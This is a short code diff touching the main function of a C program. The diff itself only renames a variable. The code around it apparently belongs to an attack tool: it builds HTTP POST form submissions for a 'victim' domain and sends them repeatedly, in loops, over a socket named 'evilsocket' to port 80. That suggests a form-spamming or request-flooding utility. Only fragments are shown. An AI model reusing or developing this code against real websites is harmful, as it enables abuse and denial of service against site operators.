@@ -81,7 +81,7 @@ int main(int argc, char *argv[]){
   char random_number[10];
   char victim[30];
   char buff[cnt_lines][MAX];
-  struct hostent *host;
+  struct hostent *h;
   struct sockaddr_in serv_addr;
   while(ccnt < req){
     while(cnt < cnt_lines){
@@ -116,11 +116,11 @@ int main(int argc, char *argv[]){
         "Content-Type: application/x-www-form-urlencoded\r\n"
         "Content-Length: %d\r\n\r\n%s", domain, content_lenght, content);
     
-      host = gethostbyname(domain);
+      h = gethostbyname(domain);
       memset(&serv_addr, 0, sizeof(serv_addr));
       serv_addr.sin_family = AF_INET;
       serv_addr.sin_port = htons(80);
-      serv_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*((struct in_addr *) host->h_addr)));
+      serv_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*((struct in_addr *) h->h_addr)));
       evilsocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
       connect(evilsocket, (struct sockaddr*) &serv_addr, sizeof(serv_addr));
       if(write(evilsocket, buff[cnt], strlen(buff[cnt]) + 1) == -1)
@@ -131,7 +131,7 @@ int main(int argc, char *argv[]){
     ccnt++;
   }
   memset(&buff, 0, sizeof(buff));
-  memset(&host, 0, sizeof(host));
+  memset(&h, 0, sizeof(h));
   memset(&serv_addr, 0, sizeof(serv_addr));
   return(0);
 }
